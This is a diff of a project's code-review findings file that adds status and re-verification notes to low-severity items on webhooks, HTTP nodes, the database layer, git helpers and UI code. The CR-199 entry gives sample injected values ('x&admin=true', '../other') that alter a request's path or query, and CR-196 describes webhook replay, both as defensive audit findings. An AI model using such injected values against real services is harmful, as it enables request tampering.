+- **Re-verification note:** The boundary inversion is fixed. The evaluator moved to `lib/jsonata/` (a barrel at `lib/jsonata/index.ts`, on the ESLint client allowlist), the engine shim `lib/engine/jsonata-eval.ts` is deleted, and both the engine and the condition builder import `@/lib/jsonata`. The only thing left is the module-level compile `cache` Map, which the suggested fix said to make an instance field (low value; optional).
 
 - **Severity:** Low
 - **Category:** Boundaries
@@ -4477,6 +5275,10 @@ Original findings, verbatim:
 
 ### CR-196 [Low] Shared-secret webhook fallback has no replay protection
 
+- **Status at `abaa007`:** **Open**, fix in [Task 58](review-tasks/58-security-webhook-auth.md)
+- **Current location:** lib/engine/runtime/hook-store.ts:136-143,155-171; app/api/hooks/[id]/route.ts:43-46
+- **Re-verification note:** The `x-devflow-secret` fallback still accepts deliveries with no timestamp or id, and dedup runs only when a `webhook-id` header is present. A captured fallback request can therefore be replayed indefinitely, and each replay starts a new flow or resumes a waiting node. Require `webhook-id` (for dedup) plus a timestamp window on the fallback path, or explicitly document the fallback as replayable.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 2 — Engine core & shared lib
@@ -4496,6 +5298,10 @@ Original findings, verbatim:
 
 ### CR-197 [Low] `EventGrouper.group` mutates the caller's event objects
 
+- **Status at `abaa007`:** **Open**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
+- **Current location:** lib/groupEvents.ts:21-23,67-75,95-98; components/chat/timeline.ts:83-84
+- **Re-verification note:** `EventGrouper.group` still writes `_data` and `_nodeKey` onto the input rows, and `nodeRunSections` passes TanStack Query cache data straight in, so cached objects are mutated. `_nodeKey` is recomputed on every call, which makes stale values unlikely in practice, but this still breaks the no-mutation rule. Keep the parsed data in a local `WeakMap`, or shallow-copy each event before enriching it.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 2 — Engine core & shared lib
@@ -4512,6 +5318,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-198 [Low] Jira materialization uses the provider's numeric issue id as the global `tasks.id`
+
+- **Status at `abaa007`:** **Open**, fix in [Task 31](review-tasks/31-git-host-clients.md)
+- **Current location:** lib/engine/tasks/providers/jira.ts:242-262,285; lib/db/schema.sql:3-18
+- **Re-verification note:** The upsert still matches on the globally `UNIQUE` `key` and inserts `id = issue.id`, the provider's numeric id. Several Jira instances can be registered, with one active at a time via `jira.active()`, so switching instances can cause a primary-key collision or re-bind a task to another instance's issue. The file also still holds two classes (`AdfRenderer`). Use `db.uid("task_")` for the id and match on `(type, instance, key)`; this needs a schema change, which must be approved first per AGENTS.md. Move `AdfRenderer` to its own file.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4532,6 +5342,10 @@ Original findings, verbatim:
 
 ### CR-199 [Low] HTTP node: interpolated values go into the URL unencoded
 
+- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
+- **Current location:** lib/engine/nodes/kinds/http/http-node.ts:114-119,196-221
+- **Re-verification note:** `{{input.*}}` and `{{nodes.*}}` values, which can come from agent output or webhook payloads, are still inserted into the URL unencoded. A value like `x&admin=true` or `../other` can change the path or query on the allowlisted host, and the SSRF guard only checks the host. Header values are still inserted raw, so CR/LF fails with an opaque error. Apply `encodeURIComponent` to non-secret values interpolated into `url` (with an explicit raw escape hatch if needed), and reject header values containing `\r` or `\n` with a clear error.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -4548,6 +5362,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-200 [Low] HTTP output and the decision agent prompt carry unbounded payloads
+
+- **Status at `abaa007`:** **Open**, fix in [Task 26](review-tasks/26-node-config-validation.md)
+- **Current location:** lib/engine/nodes/kinds/http/http-node.ts:140-147,182-191,240-245; lib/engine/nodes/kinds/decision/decision-node.ts:234,343-344
+- **Re-verification note:** `nodes.output` still stores the full parsed body (up to the 5 MB guard cap) plus all response headers. `safeDigest` truncates string bodies only, so for JSON responses the artifact and the chat `reply` are uncapped too. The decision agent prompt still serializes the entire flow context with `JSON.stringify(vars, null, 2)`. Cap the body in the output and in `safeDigest` for non-string bodies (for example by measuring the serialized size), drop or allowlist response headers, and give the decision prompt a size-capped digest of the context.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4567,6 +5385,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-201 [Low] Magic strings for statuses, artifact kinds, event kinds and pipeline states throughout the nodes
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
+- **Current location:** lib/engine/harness/agent-runner.ts:60,119,178,188; lib/engine/nodes/shared/node-support.ts:108,189; lib/engine/nodes/kinds/pipeline/pipeline-node.ts:328,418,427,441,469,474,516,534; lib/engine/nodes/kinds/build/build-node.ts:192,202,341,391,450; lib/engine/nodes/kinds/build/step-build-node.ts:191,226,254; lib/engine/nodes/kinds/merge-request/merge-request-service.ts:70,74,113,127,129; lib/engine/nodes/chains/sdlc-chain.ts:99,121; lib/engine/nodes/kinds/start/start-node.ts:34,74,78
+- **Re-verification note:** The chain now uses `NODE_KEYS` (via `keyOfRole`), and `FLOW_STATUS`/`NODE_RUN_STATUS` exist in `constants/flow.ts` (used by agent-node and split-manager). But roughly 100 raw node-status, run-status (`"finished"`), event-kind (`"lifecycle"`, `"mr_failed"`), pipeline-state (`"canceled"`) and `"default_model"` literals remain across the nodes and harness, and the start key `"start"` is still missing from `NODE_KEYS`. Fix: add backend `EVENT_KIND`/`RUN_STATUS`/`PIPELINE_STATUS`/`ARTIFACT_KIND`/`SETTING_KEY` constants, reuse `FLOW_STATUS`, add `START` to `NODE_KEYS`, and replace the literals.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4595,6 +5417,10 @@ Original findings, verbatim:
 
 ### CR-202 [Low] `any`, non-null `!` and unsafe casts in the nodes area
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
+- **Current location:** lib/engine/harness/agent-runner.ts:118; lib/engine/nodes/kinds/merge-request/merge-request-service.ts:76-77; lib/engine/nodes/kinds/plan/plan-contract.ts:141,144,172; lib/engine/nodes/kinds/plan/branch-refinement.ts:96
+- **Re-verification note:** Fixed: the registry no longer uses `NodeDefinition<any, any>`, and the unconstrained `generatePlan` cast is gone. Still open: `runRowId … ?.id as string` still hides a missing run row (have `persistRun` return the id), `catch (e: any)` remains in merge-request-service, and new `!` assertions (`envelope.subPlan!`, `envelope.plan!`, `s.id!`) need explicit guards.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 3 — Engine nodes
@@ -4612,6 +5438,10 @@ Original findings, verbatim:
 
 ### CR-203 [Low] Build, review, resolve and pipeline `chat()` overrides drop the chat panel's model override
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
+- **Current location:** lib/engine/nodes/kinds/pipeline/pipeline-node.ts:628-643
+- **Re-verification note:** Build, review and resolve now go through `AgentRunNode.chat(ctx, content, model)` and `chatInput(content, model)`, so the chat panel's model is honored. The pipeline override still declares `chat(ctx, content)` and spreads the previous input, so the developer's model pick is ignored (the previous run's model, or the default, is used). Fix: accept `model?: string` and set `model: model ?? null` in the parsed input.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -4628,6 +5458,9 @@ Original findings, verbatim:
 
 ### CR-204 [Low] `StepBuildNode` inherits from `BuildNode` to reuse its config, then ignores that config
 
+- **Status at `abaa007`:** **Fixed**
+- **Re-verification note:** `StepBuildNode` now extends `AgentRunNode` directly as a sibling of `BuildNode`. It has its own `configSchema` (only `mcp_sources`, so no dead `prompt_rules`/`branch_pattern` knobs) and composes the shared diff and worktree logic through `BuildRunSupport`.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 3 — Engine nodes
@@ -4642,6 +5475,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-205 [Low] `StreamBuffer` reports the wrong "chars omitted" count once text has been capped
+
+- **Status at `abaa007`:** **Open**, fix in [Task 16](review-tasks/16-run-lifecycle-late-writes.md)
+- **Current location:** lib/engine/harness/stream-buffer.ts:25-30,41-48; lib/engine/harness/agent-runner.ts:138-145
+- **Re-verification note:** `capHeadTail` still re-caps the already-capped text on every push, so the "N chars omitted" marker drops earlier counts and under-reports. Tool events are also still emitted immediately while assistant and thinking text waits up to 1.5 s, so the feed shows them out of order. Fix: keep `head`/`tail`/`omitted` counters per buffer, and flush the text buffers before emitting a tool event.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4658,6 +5495,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-206 [Low] `recover()` contracts are inconsistent across nodes (double-fail, or "recovered" after failing)
+
+- **Status at `abaa007`:** **Open**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
+- **Current location:** lib/engine/nodes/kinds/script/script-node.ts:106-112; lib/engine/nodes/kinds/http/http-node.ts:92-98; lib/engine/flow-engine.ts:1955-1961; lib/engine/nodes/shared/node-definition.ts:262-266
+- **Re-verification note:** The script node still sets `failed` and emits an error, then returns `false`, so the engine fails the node again (and emits a second error when the run did not finish). The HTTP node still sets `failed` and returns `true` ("recovered"). Fix: have both return `false` with no side effects, and document the contract on `NodeDefinition.recover`.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4679,6 +5520,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-207 [Low] Dead code and dead parameters
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 07](review-tasks/07-remove-dead-and-legacy-code.md)
+- **Current location:** lib/engine/nodes/kinds/start/contract.ts:87-102; lib/engine/nodes/kinds/script/script-node.ts:168,200-208; lib/engine/nodes/kinds/build/step-build-node.ts:142,290-293; lib/engine/nodes/kinds/plan/plan-context.ts:29,122-123; lib/engine/nodes/shared/node-definition.ts:197
+- **Re-verification note:** The unused `renderAgentPrompt` import in the HTTP node is gone. Still open: `startContractZod` is exported but never imported (and still ignores `required`), `extractOutput(cfg, …)` still exists only to `void cfg`, `parentPlanMarkdown` is `async` with no await, `renderVersions` is still "dead code kept reachable", and the base `triggerInput(ctx)` has an unused parameter. Fix: delete or underscore them as the original suggests.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4702,6 +5547,10 @@ Original findings, verbatim:
 
 ### CR-208 [Low] `merge-request-service.ts` mixes several exports, duplicates its own helper, and isn't a node
 
+- **Status at `abaa007`:** **Open**, fix in [Task 49](review-tasks/49-node-kind-structure.md)
+- **Current location:** lib/engine/nodes/kinds/merge-request/merge-request-service.ts:13-49,76-82; lib/engine/nodes/chains/sdlc-chain.ts:30-34,98
+- **Re-verification note:** One file still holds `CommitError`, `isCommitError`, `HOOK_PATTERNS`, `isHookRejection` and `MergeRequestService`. `create()` still inlines `HOOK_PATTERNS.some(...)` instead of calling `isHookRejection`. `MrCreationFailed` is still built from any error message. The services still live in the `nodes/` tree (now `nodes/kinds/merge-request` and `nodes/chains`). Fix: move the errors to `merge-request/errors.ts`, call `isHookRejection`, and consider relocating these orchestration services out of `nodes/`.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 3 — Engine nodes
@@ -4721,6 +5570,10 @@ Original findings, verbatim:
 
 ### CR-209 [Low] Resolve marks comments resolved unconditionally and hides git-host failures
 
+- **Status at `abaa007`:** **Open**, fix in [Task 22](review-tasks/22-pipeline-review-resolve.md)
+- **Current location:** lib/engine/nodes/kinds/resolve/resolve-node.ts:165-176; lib/engine/nodes/shared/node-support.ts:168-170
+- **Re-verification note:** The finalize step still marks every open comment `resolved`/`resolved_by='agent'` regardless of what the agent did (including when `codeChanged` is false). Git-host `resolveComment` failures are still swallowed with `.catch(() => {})`, so the DB says resolved while the MR thread stays open. Fix: mark a comment resolved only after the host call succeeds, otherwise keep it `open` and emit a warning. Optionally use the `resolving` status while the run is in flight.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 3 — Engine nodes
@@ -4737,6 +5590,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-210 [Low] `schema.sql` is not the canonical schema; migrations are unversioned and re-run every boot
+
+- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
+- **Current location:** lib/db/schema.sql:20-37,39-52,133,151-161; lib/db/index.ts:73-259; scripts/init-prod-db.mjs:21; scripts/seed-custom-flow.mjs:38; scripts/seed-demo-flow.mjs:31
+- **Re-verification note:** `schema.sql` is still not canonical. These columns exist only as `ALTER TABLE` in `migrate()`: `flows.execution_mode/repo_id/template_id/trigger_payload`, `nodes.session_id/prompt_override/label/config/join_mode`, and the `runs` model/token/cost columns. So the scripts that bootstrap from `schema.sql` alone produce a DB that does not match `rows.ts`. There is still no `user_version`, every probe and seed re-runs on each boot, and the stray "durable cursor-run handles" comment still sits above `branches`. Fix: fold all columns into `schema.sql` and gate steps on `PRAGMA user_version`. The legacy-data parts of this item should be deleted rather than versioned (see CR-211 and CR-212).
 
 - **Severity:** Low
 - **Category:** Boundaries
@@ -4760,6 +5617,9 @@ Original findings, verbatim:
 
 ### CR-211 [Low] Legacy `flows` table rebuild drops constraints and would fail under enforced FKs
 
+- **Status at `abaa007`:** **Obsolete (legacy, no fix)**, leftover code deleted in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
+- **Re-verification note:** This only concerns the legacy tickets-to-tasks `flows` table rebuild, which the product owner no longer wants to support. The legacy code still exists (`lib/db/index.ts:466-494`, inside `migrateTicketsToTasks`, plus `renameTicketsToTasks` at 64-70) and is a candidate for a "delete legacy migrations" cleanup.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -4777,6 +5637,9 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-212 [Low] Legacy normalizers do full-table scans plus per-row prepares on every boot
+
+- **Status at `abaa007`:** **Obsolete (legacy, no fix)**, leftover code deleted in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
+- **Re-verification note:** This concerns the legacy data normalizers, which are out of scope now that legacy flows are unsupported. The code still runs on every boot: `normalizeLegacyModelSpecs`/`FlowTriggers`/`Comments`/`McpSources` at `lib/db/index.ts:254-405` (comments still do a full scan plus a prepare inside the loop at 372), and the `gitlab_pipeline` remap and `template_id` backfill at 246-253. Delete them as part of the legacy-code cleanup.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4801,6 +5664,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-213 [Low] `any` and non-null `!` in area code
+
+- **Status at `abaa007`:** **Open**, fix in [Task 46](review-tasks/46-backend-types-cleanup.md)
+- **Current location:** lib/db/index.ts:75,480-481,525,548,568,858,862,866,897,913,919,973,985; lib/git/local.ts:152,155,165; lib/integrations/gitlab/client.ts:75,317,319; lib/integrations/gitlab/git-host.ts:103,155,251; lib/integrations/jira/service.ts:88,90
+- **Re-verification note:** The `get<T = any>`/`all<T = any>`/`run(...args: any[])`/`emitEvent(data?: any)`/`getSetting<T = any>`/`setSetting(value: any)` defaults remain. `upsertRepo` still returns `this.repoById(...)!`, and `parseWebhook` still treats the body as `any` with no Zod validation. Fix: default the generics to `unknown`, throw a typed `RepoNotFoundError`, add Zod schemas for the webhook payloads, and use `catch (e: unknown)`.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -4828,6 +5695,10 @@ Original findings, verbatim:
 
 ### CR-214 [Low] Duplicated git exec wrappers, timeouts and helpers across three modules
 
+- **Status at `abaa007`:** **Open**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/git/worktrees.ts:8-13,498-504,645-653; lib/git/local.ts:9-14,46-55,126-132,193; lib/integrations/local-agent/agent.ts:17,121-142; lib/integrations/gitlab/git-host.ts:19; lib/integrations/jira/service.ts:14
+- **Re-verification note:** There are still three independent `execFile("git")` wrappers. `MAX_BUFFER` differs (10 MB in worktrees, 50 MB in local) and local-agent sets no default timeout. `headBranch` and `currentBranch` are identical, the base-ref fallback chain is duplicated (worktrees 450-463, local 193), and `maskToken` is duplicated in GitLab and Jira. Fix: add a shared `GitRunner` class with timeouts, redaction and typed errors injected into all three, and move `maskToken` to a shared util.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 4 — DB, git, integrations
@@ -4853,6 +5724,10 @@ Original findings, verbatim:
 
 ### CR-215 [Low] Module-level singletons created outside `processSingleton`, one with mutable state
 
+- **Status at `abaa007`:** **Open**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/git/worktrees.ts:246,656-657; lib/git/local.ts:236; lib/git/dep-policy.ts:255; lib/git/worktree-setup.ts:294,562; lib/integrations/gitlab/client.ts:325; lib/integrations/jira/service.ts:97; lib/integrations/cursor/client.ts:120; lib/db/rows.ts:433
+- **Re-verification note:** These are still plain module-level `new X()` singletons outside `processSingleton`. `worktrees` holds the mutable `inflight` Map, so the "one scan per repo" coalescing splits across `next dev` module graphs, and the comment still calls it "stateless enough". Fix: wrap them with `processSingleton(...)` and correct the comment.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 4 — DB, git, integrations
@@ -4869,6 +5744,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-216 [Low] `cursor/credentials.ts` is a cohesive functional module that AGENTS.md section 3.5 says should be a class; setting key repeated
+
+- **Status at `abaa007`:** **Open**, fix in [Task 50](review-tasks/50-small-module-cleanups.md)
+- **Current location:** lib/integrations/cursor/credentials.ts:9-26; lib/integrations/local-agent/agent.ts:88-92; app/api/settings/route.ts:80-82,138-145
+- **Re-verification note:** There are still four loose functions with `"cursor.api_key"` repeated four times, and `setCursorApiKey("")` duplicates `clearCursorApiKey()`. The `local_agent.*` setting keys are still repeated between the agent and the settings route. Fix: create a `CursorCredentials` class and add setting-key constants (for example `constants/settings.ts` or a module const).
 
 - **Severity:** Low
 - **Category:** Boundaries
@@ -4890,6 +5769,10 @@ Original findings, verbatim:
 
 ### CR-217 [Low] Domain magic strings in the DB layer (template ids, node keys, statuses)
 
+- **Status at `abaa007`:** **Open**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
+- **Current location:** lib/db/index.ts:253,607-677 (7× 'tpl_sdlc_loop', 'tpl_step_build' at 670-677); lib/db/index.ts:391; lib/db/rows.ts:37,84,157,173,216,233,252,399
+- **Re-verification note:** The DB layer still hardcodes the template ids and node keys in SQL, even though `SDLC_TEMPLATE_ID` (templates/template-store.ts:44) and `STEP_BUILD_TEMPLATE_ID`/`NODE_KEYS` (engine/constants/node-keys.ts) now exist. Flow, branch, run, comment and step-merge statuses are still `z.string()` in `rows.ts` (only nodes use `z.enum(NODE_STATUSES)`). Fix: pass the existing constants as SQL parameters and add status `as const` maps used as `z.enum`.
+
 - **Severity:** Low
 - **Category:** Code quality
 - **Area:** Area 4 — DB, git, integrations
@@ -4904,6 +5787,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-218 [Low] `listWorktrees` coalescing can serve a pre-mutation scan to callers that require a "fresh" listing
+
+- **Status at `abaa007`:** **Open**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/git/worktrees.ts:253-266,320-331,549,611-614
+- **Re-verification note:** `listWorktrees` still lets any caller join an in-flight scan. `preflightRemoval`'s "fresh strict re-list", the verify path and the branch-delete guard can therefore act on a scan that started before a concurrent add or remove. Fix: add a `{ fresh: true }` option that bypasses coalescing (or a per-repo generation counter) and use it on those paths.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4921,6 +5808,10 @@ Original findings, verbatim:
 
 ### CR-219 [Low] SSH-style repo URLs are not supported by GitLab project-path parsing
 
+- **Status at `abaa007`:** **Open**, fix in [Task 31](review-tasks/31-git-host-clients.md)
+- **Current location:** lib/integrations/gitlab/client.ts:51-57,233-244
+- **Re-verification note:** The project-path parsing still uses `/^[a-z]+:\/\/[^/]+\/(.+)$/i`, so scp-style `git@host:group/repo.git` is URL-encoded whole and every API call 404s. `hostOf` returns null for it too. Fix: parse the `user@host:path` form (and `ssh://`) and validate repo URLs with Zod at registration.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -4937,6 +5828,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-220 [Low] Jira credential test hardcodes the Cloud v3 API and Basic auth; multiple instances are silently ignored
+
+- **Status at `abaa007`:** **Open**, fix in [Task 31](review-tasks/31-git-host-clients.md)
+- **Current location:** lib/integrations/jira/service.ts:62-68,76-93
+- **Re-verification note:** `testInstance` still always calls `/rest/api/3/myself` with Basic `email:token`, so Data Center PATs (`/rest/api/2` with Bearer auth) likely fail; this still needs checking against a DC instance. `active()` still returns `listInstances()[0]`, silently ignoring any other instance. Fix: store a per-instance deployment/auth kind, and either reject a second instance or make the active instance explicit.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -4957,6 +5852,10 @@ Original findings, verbatim:
 
 ### CR-221 [Low] `schema.sql` is loaded relative to `process.cwd()`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 08](review-tasks/08-db-bootstrap-and-schema.md)
+- **Current location:** lib/db/index.ts:48-51
+- **Re-verification note:** `schema.sql` is still read from `path.join(process.cwd(), "lib/db/schema.sql")`, so launching from any other directory throws ENOENT on first DB access. Fix: resolve the path via `config` or embed the schema as a TS string module.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -4976,6 +5875,10 @@ Original findings, verbatim:
 
 ### CR-222 [Low] `lib/git/local.ts` depends on the engine layer
 
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/git/local.ts:35-38,57-65; lib/engine/ports/git-host.ts:278-284
+- **Re-verification note:** Fixed: the layering inversion. `lib/git/local.ts` no longer imports the engine, and callers pass an `AuthedUrlResolver`. Remaining: routing and credential errors are still swallowed twice (`authedCloneUrlFor` and `LocalGit.authedUrl` both catch and fall back to the raw repo URL), so a missing token silently becomes an unauthenticated push. Fix: let the resolver throw a typed error and surface it.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 4 — DB, git, integrations
@@ -4992,6 +5895,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-223 [Low] In-process run handles leak if a started run is never streamed
+
+- **Status at `abaa007`:** **Open**, fix in [Task 32](review-tasks/32-agent-ports.md)
+- **Current location:** lib/integrations/cursorSdk.ts:148-150,267,272-278,284-292; lib/engine/harness/agent-runner.ts:116-118
+- **Re-verification note:** `createRun` still registers the handle, and only `streamRun`'s `finally` removes it and closes the agent. `cancelRun` doesn't release it, and any throw between `start()` and `port.stream` (for example `persistRun`) leaks the handle while `hasActiveRun` stays true. This is still unverified at runtime. Fix: release and close in `cancelRun`, and add a `release(runId)` for callers' `finally` (or a TTL sweep).
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -5011,6 +5918,10 @@ Original findings, verbatim:
 
 ### CR-224 [Low] Worktree base resolution silently falls back to the hub's current `HEAD`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 33](review-tasks/33-git-and-worktree-process-safety.md)
+- **Current location:** lib/git/worktrees.ts:449-463
+- **Re-verification note:** `resolveBaseRef` still ends its candidate chain with `"HEAD"`, so a missing default branch silently cuts the flow branch from whatever the hub has checked out. Fix: drop `HEAD` and throw a typed `BaseRefNotFoundError` naming the configured branch, or fetch `origin <base>` once first.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 4 — DB, git, integrations
@@ -5028,6 +5939,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-225 [Low] `getMRChanges` uses the deprecated `/changes` endpoint and ignores truncation
+
+- **Status at `abaa007`:** **Open**, fix in [Task 31](review-tasks/31-git-host-clients.md)
+- **Current location:** lib/integrations/gitlab/client.ts:104-106,262-263; lib/integrations/gitlab/git-host.ts:102-110
+- **Re-verification note:** This still uses the deprecated `/merge_requests/:iid/changes` endpoint and ignores `overflow`, so the AI review can silently review a truncated diff. Fix: switch to the paginated `/diffs` and surface a `truncated` flag on the port result.
 
 - **Severity:** Low
 - **Category:** Correctness
@@ -5047,6 +5962,9 @@ Original findings, verbatim:
 
 ### CR-226 [Low] `useNodePrompt` shows the previous node's prompt as placeholder data after a node switch
 
+- **Status at `abaa007`:** **Fixed**
+- **Re-verification note:** `useNodePrompt` (hooks/use-flow-chat.ts:39-48) no longer sets `placeholderData: keepPreviousData`, so switching nodes shows the new node's loading state instead of the previous node's prompt.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -5064,6 +5982,10 @@ Original findings, verbatim:
 
 ### CR-227 [Low] Index-based React keys remount rows: run sections lose expand state, and draft rows shift focus
 
+- **Status at `abaa007`:** **Open**, fix in [Task 36](review-tasks/36-cockpit-a11y-and-rendering.md)
+- **Current location:** components/chat/ChatFeed.tsx:72-83; components/chat/RunSectionRow.tsx:61-63; components/flows/components/plan/components/planSteps/PlanSteps.tsx:136-144
+- **Re-verification note:** Run-section keys are still index-qualified (`r${section.key}#${i}`), feed items still use `key={i}`, and plan-step drafts still use `key={i}` with remove-by-index. Rows therefore remount and lose expand state when earlier rows shift. Fix: key sections by a stable identity (section key plus first event id), feed items by event or tool id, and drafts by a client id created in the draft factory.
+
 - **Severity:** Low
 - **Category:** Correctness
 - **Area:** Area 5 — Flow runtime UI
@@ -5079,6 +6001,10 @@ Original findings, verbatim:
 - **Effort:** S
 
 ### CR-228 [Low] Domain strings (actions, node kinds/types, event types, merge statuses, modes) hardcoded instead of constants
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 55](review-tasks/55-frontend-constants-and-types.md)
+- **Current location:** components/flows/panels/AgentView.tsx:57,62; DecisionView.tsx:61; ScriptView.tsx:41; HttpView.tsx:38; StartView.tsx:47; FanoutStepList.tsx:21,120,136,143,149,157; BuildView.tsx:54,64; FlowHeader.tsx:57; StatusBar.tsx:9,70; DeclarativeView.tsx:20; GraphEdges.tsx:46; components/chat/EventRow.tsx:18; components/chat/FlowEventRow.tsx:20; components/chat/RunSectionRow.tsx:73
+- **Re-verification note:** `FLOW_STATUS`/`STATUS_VARIANT` are now used in the panels, and `EXECUTION_MODE_LOCAL` is used in FlowColumns, FlowsView and NodePanel. `FLOW_ACTION` exists but has only `RUN_NODE` and is used nowhere. Panels still type `"approve_node"`, `"run_node"`, `"*_fanout_step"`, `"mr_failed"`, `"lifecycle"`, `"conflict"`, `"decision"` and `"local"` (FlowHeader, StatusBar) inline. Fix: complete `FLOW_ACTION`, add `FLOW_EVENT_TYPE`/`MERGE_STATUS`/`NODE_KIND`, use them, and reuse `EXECUTION_MODE_LOCAL`.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5108,6 +6034,10 @@ Original findings, verbatim:
 
 ### CR-229 [Low] Single-consumer hooks live in shared `hooks/` instead of their feature folders
 
+- **Status at `abaa007`:** **Open**, fix in [Task 54](review-tasks/54-feature-layout-and-naming.md)
+- **Current location:** hooks/use-agent-status.ts; hooks/use-artifact-fetcher.ts; hooks/use-flow-comments.ts; hooks/use-graph-def.ts; hooks/use-model-catalog.ts; hooks/use-flow-prompt.ts
+- **Re-verification note:** These six hooks still each have exactly one consuming feature (flows: agent-status, artifact-fetcher, flow-comments, graph-def; chat: model-catalog, flow-prompt). `use-flow-chat` now has consumers in both chat and the flows plan feature, so it legitimately stays shared. Fix: move the six into `components/flows/hooks/` and `components/chat/hooks/`, renaming to the camelCase `useThing.ts` convention that AGENTS.md §2.9 now requires.
+
 - **Severity:** Low
 - **Category:** Boundaries
 - **Area:** Area 5 — Flow runtime UI
@@ -5126,6 +6056,10 @@ Original findings, verbatim:
 - **Effort:** M
 
 ### CR-230 [Low] Oversized files and multiple exported components per file
+
+- **Status at `abaa007`:** **Partly fixed**, fix in [Task 54](review-tasks/54-feature-layout-and-naming.md)
+- **Current location:** components/flows/panels/ReviewView.tsx:38,66,177,196,229 (248 lines); components/flows/FlowStatus.tsx:9-77; components/flows/panels/ArtifactViews.tsx:19,49,102; components/chat/ModelSelector.tsx:25-28; components/chat/prompt-modal/PromptModal.tsx (205 lines)
+- **Re-verification note:** PlanView (100 lines), FlowCockpit (115) and use-flow-prompt (186) have been split down. Still open: ReviewView mixes `buildThreads` with three internal components, FlowStatus exports five items, ArtifactViews exports three components, and ModelSelector still exports the `useModels` hook. PromptModal is borderline at 205 lines. Fix: extract `buildThreads` and the thread components, split FlowStatus and ArtifactViews one component per file, and move `useModels` into the hook module.
 
 - **Severity:** Low
 - **Category:** Code quality
@@ -5147,6 +6081,10 @@ Original findings, verbatim:
 
 ### CR-231 [Low] Empty-state markup duplicated instead of reusing `PanelEmptyState`; generic components not in `components/shared/`
 
+- **Status at `abaa007`:** **Open**, fix in [Task 52](review-tasks/52-shared-ui-components.md)
+- **Current location:** components/flows/panels/AgentView.tsx:105-108; components/flows/panels/ArtifactViews.tsx:40-43; components/flows/panels/BuildView.tsx:194-197; components/flows/panels/ReviewView.tsx:131-134; components/flows/components/plan/components/PlanEmptyHint.tsx:9; components/flows/panels/PanelEmptyState.tsx; components/chat/ChatFeedError.tsx
+- **Re-verification note:** Four panels (plus the new PlanEmptyHint) still hand-roll the icon-plus-muted-text empty block with drifting `py-10`/`py-16`, while HttpView, ScriptView and DecisionView use `PanelEmptyState`. `PanelEmptyState` and `ChatFeedError` are still in feature folders, not `components/shared/`. Fix: use `PanelEmptyState` everywhere and promote it (as `EmptyHint`) and a generic `InlineError` to `components/shared/`.
+
 - **Severity:** Low
 - **Category:** Code quality
